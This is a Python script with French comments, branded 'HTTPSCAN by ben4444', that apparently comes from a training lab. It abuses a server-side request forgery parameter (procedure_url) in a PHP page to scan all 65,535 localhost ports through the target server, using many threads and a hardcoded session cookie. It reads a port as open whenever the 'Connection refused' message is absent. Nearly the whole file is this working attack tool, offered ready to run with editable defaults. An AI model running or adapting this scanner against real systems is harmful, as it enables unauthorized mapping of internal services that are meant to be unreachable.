#!/usr/bin/env python3
# scan_http_thread.py

########################################################
###################### CONFIG ##########################
########################################################


URL_DEFAULT = "http://tp8.esdown.local/external.php?procedure_url=http://localhost:"
ERREUR_DEFAULT = "Failed to open stream: Connection refused"
COOKIE_PHPSESSID_DEFAULT = "978ada7861e78631e0371c42ba5d5166"  
PORT_START_DEFAULT = 1
PORT_STOP_DEFAULT = 65535
THREADS_DEFAULT = 20 #attention au ddos



########################################################
###################### IMPORT ##########################
########################################################

import requests
import curses
import time
import concurrent.futures
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry # type: ignore
import signal
import threading
from colorama import init, Fore, Back, Style


########################################################
###################### FONCTIONS #######################
########################################################


def afficher_barre_progression(stdscr, pourcentage, port_actuel, debut_temps):
    hauteur, largeur = stdscr.getmaxyx()
    longueur_barre = largeur - 20  # Réduire la longueur de la barre pour laisser de la place au port
    remplissage = int(longueur_barre * pourcentage / 100)
    barre = '█' * remplissage + '░' * (longueur_barre - remplissage)
    stdscr.attron(curses.color_pair(3))
    
    temps_ecoule = time.time() - debut_temps
    if temps_ecoule > 10:
        temps_estime = (temps_ecoule / pourcentage) * (100 - pourcentage) if pourcentage > 0 else 0
        minutes_ecoulees = int(temps_ecoule // 60)
        secondes_ecoulees = int(temps_ecoule % 60)
        minutes_estimees = int(temps_estime // 60)
        secondes_estimees = int(temps_estime % 60)
        if temps_ecoule % 1.2 < 0.1:
            stdscr.addstr(hauteur - 2, 0, f"Temps passé: {minutes_ecoulees:02d}m {secondes_ecoulees:02d}s | Temps restant estimé: {minutes_estimees:02d}m {secondes_estimees:02d}s")
    
    stdscr.addstr(hauteur - 3, 0, f"Port actuel: {port_actuel}")
    stdscr.addstr(hauteur - 1, 0, f"[{barre}] {pourcentage:.1f}%")
    stdscr.attroff(curses.color_pair(3))
    stdscr.refresh()

def verifier_port(port, stop_event):
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.1)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    try:
        if stop_event.is_set():
            return None
        with session.get(URL+str(port), cookies=COOKIE, timeout=5) as response:
            if ERREUR not in response.text:
                return port
    except requests.RequestException:
        pass
    finally:
        session.close()
    return None

def main(stdscr):
    debut_temps = time.time()
    curses.curs_set(0)
    stdscr.clear()
    
    # Initialisation des couleurs
    curses.start_color()
    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)  # Pour les infos
    curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_RED)  # Pour les ports ouverts
    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)  # Pour la barre de progression
    curses.init_pair(4, curses.COLOR_GREEN, curses.COLOR_BLACK)  # Pour l'ASCII art

    # Afficher l'ASCII art
    stdscr.attron(curses.color_pair(4))
    for i, line in enumerate(start.split('\n')):
        stdscr.addstr(i, 0, line)
    stdscr.attroff(curses.color_pair(4))

    # Afficher les informations dans l'en-tête
    start_y = len(start.split('\n')) + 1
    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(start_y, 0, f"URL: {URL}")
    stdscr.addstr(start_y + 1, 0, f"ERREUR: {ERREUR}")
    stdscr.addstr(start_y + 2, 0, f"COOKIE: {COOKIE}")
    stdscr.addstr(start_y + 3, 0, f"PLAGE_PORTS: {debut} - {fin}")
    stdscr.addstr(start_y + 4, 0, f"THREADS: {THREADS}")
    stdscr.attroff(curses.color_pair(1))
    stdscr.addstr(start_y + 6, 0, "Ports ouverts:")

    total_ports = len(PLAGE_PORTS)
    ports_ouverts = []

    stop_event = threading.Event()

    def signal_handler(signum, frame):
        stop_event.set()
        raise KeyboardInterrupt

    signal.signal(signal.SIGINT, signal_handler)

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(verifier_port, port, stop_event): port for port in PLAGE_PORTS}
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                if stop_event.is_set():
                    break
                port = futures[future]
                result = future.result()
                if result:
                    ports_ouverts.append(result)
                    stdscr.attron(curses.color_pair(2))
                    stdscr.addstr(len(ports_ouverts) + start_y + 6, 0, f"Port {result} ouvert : {URL+str(result)}")
                    stdscr.attroff(curses.color_pair(2))

                pourcentage = (i + 1) / total_ports * 100
                afficher_barre_progression(stdscr, pourcentage, port, debut_temps)

                stdscr.refresh()

        fin_temps = time.time()
        temps_execution = fin_temps - debut_temps
        minutes = int(temps_execution // 60)
        secondes = int(temps_execution % 60)
        stdscr.addstr(len(ports_ouverts) + start_y + 8, 0, f"Scan terminé en {minutes} minutes et {secondes} secondes. Appuyez sur une touche pour quitter.")
        stdscr.refresh()
        stdscr.getch()
    except curses.error:
        stop_event.set()
        executor.shutdown(wait=False)
        fin_temps = time.time()
        temps_execution = fin_temps - debut_temps
        minutes = int(temps_execution // 60)
        secondes = int(temps_execution % 60)
        stdscr.addstr(len(ports_ouverts) + start_y + 8, 0, f"Scan interrompu après {minutes} minutes et {secondes} secondes. Appuyez sur une touche pour quitter.")
        stdscr.refresh()
        stdscr.getch()
        pass  # Ignorer les erreurs de curses (comme l'écriture hors de l'écran)
    except KeyboardInterrupt:
        try:
            stop_event.set()
            executor.shutdown(wait=False)
            fin_temps = time.time()
            temps_execution = fin_temps - debut_temps
            minutes = int(temps_execution // 60)
            secondes = int(temps_execution % 60)
            stdscr.addstr(len(ports_ouverts) + start_y + 8, 0, f"Scan interrompu après {minutes} minutes et {secondes} secondes. Appuyez sur une touche pour quitter.")
            stdscr.refresh()
            stdscr.getch()
        except KeyboardInterrupt:
            stop_event.set()
            executor.shutdown(wait=False)
            fin_temps = time.time()
            temps_execution = fin_temps - debut_temps
            minutes = int(temps_execution // 60)
            secondes = int(temps_execution % 60)
            stdscr.addstr(len(ports_ouverts) + start_y + 8, 0, f"Scan interrompu après {minutes} minutes et {secondes} secondes. Appuyez sur une touche pour quitter.")
            stdscr.refresh()
            stdscr.getch()

    
    return ports_ouverts, temps_execution


########################################################
###################### VARIABLES #######################
########################################################

# Initialiser colorama
init()

# Demander à l'utilisateur de saisir les variables
try:
    if input("Utiliser la config du code ? (O/n) : ") != "n":
        URL = URL_DEFAULT
        ERREUR = ERREUR_DEFAULT
        COOKIE_PHPSESSID = COOKIE_PHPSESSID_DEFAULT
        COOKIE = {"PHPSESSID": COOKIE_PHPSESSID}
        debut = PORT_START_DEFAULT
        fin = PORT_STOP_DEFAULT
        PLAGE_PORTS = range(debut, fin + 1)
        THREADS = THREADS_DEFAULT
        print(Fore.CYAN + f"URL : {URL}" + Style.RESET_ALL)
        print(Fore.CYAN + f"ERREUR : {ERREUR}" + Style.RESET_ALL)
        print(Fore.CYAN + f"COOKIE : {COOKIE}" + Style.RESET_ALL)
        print(Fore.CYAN + f"PLAGE_PORTS : {debut}-{fin}" + Style.RESET_ALL)
        print(Fore.CYAN + f"THREADS : {THREADS}" + Style.RESET_ALL)
    else:
        URL = input(Fore.CYAN + f"Entrez l'URL ou par defaut : {URL_DEFAULT} : " + Style.RESET_ALL) or URL_DEFAULT
        ERREUR = input(Fore.CYAN + f"Entrez le message d'erreur ou par defaut : {ERREUR_DEFAULT} : " + Style.RESET_ALL) or ERREUR_DEFAULT
        COOKIE_PHPSESSID = input(Fore.CYAN + f"Entrez la valeur PHPSESSID du cookie ou par defaut : {COOKIE_PHPSESSID_DEFAULT} : " + Style.RESET_ALL) or COOKIE_PHPSESSID_DEFAULT
        COOKIE = {"PHPSESSID": COOKIE_PHPSESSID}
        debut = int(input(Fore.CYAN + f"Entrez le début de la plage de ports ou par defaut : {PORT_START_DEFAULT} : " + Style.RESET_ALL) or PORT_START_DEFAULT ) 
        fin = int(input(Fore.CYAN + f"Entrez la fin de la plage de ports ou par defaut : {PORT_STOP_DEFAULT} : " + Style.RESET_ALL) or PORT_STOP_DEFAULT ) 
        PLAGE_PORTS = range(debut, fin + 1)
        THREADS = int(input(Fore.CYAN + f"Entrez le nombre de threads ou par defaut : {THREADS_DEFAULT} (conseillé) : " + Style.RESET_ALL) or THREADS_DEFAULT)
except KeyboardInterrupt:
    print(Fore.RED + "\nQuit" + Style.RESET_ALL)
    exit()

start = """
  _  _ _____ _____ ___   ___  ___   _   _  _ 
 | || |_   _|_   _| _ \ / __|/ __| /_\ | \| |
 | __ | | |   | | |  _/ \__ \ (__ / _ \| .` |
 |_||_| |_|   |_| |_|   |___/\___/_/ \_\_|\_|
                                            by ben4444
"""


########################################################
###################### EXECUTION #######################
########################################################

if __name__ == "__main__":
    ports_ouverts, temps_execution = curses.wrapper(main)
    minutes = int(temps_execution // 60)
    secondes = int(temps_execution % 60)
    print(Fore.YELLOW + f"\nTemps d'exécution : {minutes} minutes et {secondes} secondes" + Style.RESET_ALL)
    print(Fore.GREEN + "\nListe des ports ouverts :" + Style.RESET_ALL)
    for port in ports_ouverts:
        print(Fore.RED + f"Port {port} ouvert : {URL+str(port)}" + Style.RESET_ALL)
